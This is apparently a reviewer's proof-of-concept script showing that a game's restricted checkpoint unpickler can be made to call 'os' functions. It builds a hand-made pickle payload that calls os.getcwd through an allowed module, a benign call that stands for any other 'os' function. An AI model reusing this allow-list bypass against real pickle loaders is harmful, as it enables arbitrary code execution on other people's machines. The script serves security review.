"""The reviewer's probe of the checkpoint loader's allow-list (package 114; run from the
repository's root at 504a250; writes nothing).

`freesail/core/replay.py` says of a checkpoint that it "cannot run code here". The loader
(`_Unpickler.find_class`) admits any name inside any module whose name begins `freesail.`,
which includes whatever those modules have themselves imported, and `builtins.getattr`.
This builds, by hand, a pickle that names `os.getcwd` through `freesail.settings` and
calls it: a harmless call, which stands for any other function of `os`.

Output at the commit under review:

    ALLOWED freesail.settings os
    ALLOWED freesail.core.replay pickle
    refused os system
    A FUNCTION NOT OF THE GAME WAS CALLED BY LOADING: os.getcwd() -> <the working directory>
"""

import io
import pickle

from freesail.core import replay

U = replay._Unpickler
u = U(io.BytesIO(b""))
for mod, name in [("freesail.settings", "os"), ("freesail.core.replay", "pickle"), ("os", "system")]:
    try:
        u.find_class(mod, name)
        print("ALLOWED", mod, name)
    except Exception as e:  # the loader's own refusal
        print("refused", mod, name)

MOD, NAME = b"freesail.settings", b"os.getcwd"
payload = (
    pickle.PROTO
    + b"\x04"
    + pickle.SHORT_BINUNICODE
    + bytes([len(MOD)])
    + MOD
    + pickle.SHORT_BINUNICODE
    + bytes([len(NAME)])
    + NAME
    + pickle.STACK_GLOBAL
    + pickle.EMPTY_TUPLE
    + pickle.REDUCE
    + pickle.STOP
)
try:
    out = U(io.BytesIO(payload)).load()
    print("A FUNCTION NOT OF THE GAME WAS CALLED BY LOADING: os.getcwd() ->", out)
except Exception as e:
    print("refused:", type(e).__name__, str(e)[:120])
